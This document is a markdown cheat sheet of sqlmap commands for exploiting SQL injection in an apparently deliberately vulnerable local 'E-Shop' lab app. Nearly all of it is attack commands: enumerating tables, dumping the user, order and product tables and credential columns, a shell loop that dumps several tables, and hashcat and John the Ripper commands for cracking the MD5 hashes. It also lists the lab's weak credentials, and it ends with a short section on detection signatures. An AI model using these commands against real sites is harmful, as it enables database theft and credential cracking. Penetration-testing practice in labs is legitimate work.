# SQLMap Working Commands for E-Shop SQL Injection

## Confirmed Working Command

This command successfully dumped the user table:

```bash
sqlmap -u "http://127.0.0.1:8000/?q=test" \
       --cookie="sessionid=YOUR_SESSION_ID" \
       --batch \
       --threads 8 \
       -T eshop_customuser \
       --dump
```

## Step-by-Step SQLMap Attack

### 1. Initial Detection
```bash
sqlmap -u "http://127.0.0.1:8000/?q=test" \
       --cookie="sessionid=YOUR_SESSION_ID" \
       --batch \
       --threads 8
```

### 2. Get Current Database
```bash
sqlmap -u "http://127.0.0.1:8000/?q=test" \
       --cookie="sessionid=YOUR_SESSION_ID" \
       --batch \
       --threads 8 \
       --current-db
```

### 3. List All Tables
```bash
sqlmap -u "http://127.0.0.1:8000/?q=test" \
       --cookie="sessionid=YOUR_SESSION_ID" \
       --batch \
       --threads 8 \
       --tables
```

### 4. Dump Specific Tables

**User Credentials:**
```bash
sqlmap -u "http://127.0.0.1:8000/?q=test" \
       --cookie="sessionid=YOUR_SESSION_ID" \
       --batch \
       --threads 8 \
       -T eshop_customuser \
       --dump
```

**Products:**
```bash
sqlmap -u "http://127.0.0.1:8000/?q=test" \
       --cookie="sessionid=YOUR_SESSION_ID" \
       --batch \
       --threads 8 \
       -T eshop_product \
       --dump
```

**Orders:**
```bash
sqlmap -u "http://127.0.0.1:8000/?q=test" \
       --cookie="sessionid=YOUR_SESSION_ID" \
       --batch \
       --threads 8 \
       -T eshop_order \
       --dump
```

### 5. Extract Specific Columns
```bash
sqlmap -u "http://127.0.0.1:8000/?q=test" \
       --cookie="sessionid=YOUR_SESSION_ID" \
       --batch \
       --threads 8 \
       -T eshop_customuser \
       -C username,email,password \
       --dump
```

### 6. Full Database Dump
```bash
sqlmap -u "http://127.0.0.1:8000/?q=test" \
       --cookie="sessionid=YOUR_SESSION_ID" \
       --batch \
       --threads 8 \
       --dump-all
```

## Advanced Exploitation

### Get Database Schema
```bash
sqlmap -u "http://127.0.0.1:8000/?q=test" \
       --cookie="sessionid=YOUR_SESSION_ID" \
       --batch \
       --threads 8 \
       --schema
```

### Search for Specific Data
```bash
sqlmap -u "http://127.0.0.1:8000/?q=test" \
       --cookie="sessionid=YOUR_SESSION_ID" \
       --batch \
       --threads 8 \
       --search -C password
```

### Extract Without Dumping (Count Records)
```bash
sqlmap -u "http://127.0.0.1:8000/?q=test" \
       --cookie="sessionid=YOUR_SESSION_ID" \
       --batch \
       --threads 8 \
       -T eshop_customuser \
       --count
```

## What SQLMap Extracts

From the `eshop_customuser` table, SQLMap will dump:
- User IDs (UUIDs)
- Usernames
- Email addresses
- Password hashes (weak MD5)
- First/Last names
- Join dates
- Last login times
- Admin/Staff status

## Post-Exploitation

### Crack Weak MD5 Passwords
Since the app uses weak MD5 hashing, you can crack the passwords:

```bash
# Save hashes to file
echo "HASH_HERE" > hashes.txt

# Crack with hashcat
hashcat -m 0 hashes.txt /path/to/wordlist.txt

# Or with John the Ripper
john --format=raw-md5 hashes.txt
```

### Known Weak Passwords in Database
- admin:admin123
- test:test123
- john:password
- maria:123456
- george:george

## Important Notes

1. **Session Required**: You must be logged in and provide a valid sessionid
2. **SQLite Database**: The backend is SQLite, not MySQL/PostgreSQL
3. **Weak Hashing**: Passwords are stored as MD5 hashes (intentionally vulnerable)
4. **No Rate Limiting**: SQLMap can use multiple threads safely

## Automation Script

Create `dump_all.sh`:
```bash
#!/bin/bash
SESSION_ID="YOUR_SESSION_ID"
BASE_URL="http://127.0.0.1:8000/?q=test"

# Dump all interesting tables
for table in eshop_customuser eshop_product eshop_order eshop_cart eshop_productreview; do
    echo "[*] Dumping $table..."
    sqlmap -u "$BASE_URL" \
           --cookie="sessionid=$SESSION_ID" \
           --batch \
           --threads 8 \
           -T "$table" \
           --dump
done
```

## Detection Signatures

This attack creates these signatures in logs:
- Multiple requests with SQL syntax in query parameter
- Requests for non-existent products with SQL operators
- High volume of requests from single session
- Database errors in application logs
- Successful dumps create local files in `~/.sqlmap/output/`